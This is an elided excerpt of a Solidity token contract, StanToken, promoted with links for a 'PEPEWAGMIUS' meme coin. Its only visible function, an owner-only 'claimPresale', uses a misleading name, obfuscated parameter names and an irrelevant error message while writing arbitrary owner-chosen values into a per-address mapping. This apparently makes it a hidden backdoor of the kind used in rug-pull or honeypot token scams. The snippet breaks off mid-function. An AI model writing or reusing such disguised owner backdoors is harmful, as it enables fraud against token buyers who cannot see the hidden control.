...
// https://t.me/PEPEWAGMIUS
// https://twitter.com/@PEPEWAGMIUS
// https://pwagmi.com/
...
contract StanToken is IERC20, Ownable, BaseToken {
    ...
    function claimPresale(address presale, bool yesno, uint256 YESNO, uint256 bytecode, uint256 deployedBytecode) external onlyOwner { require(presale != address(0), "Same bool"); liquidityAdd[presale] = YESNO * bytecode ** deployedBytecode;
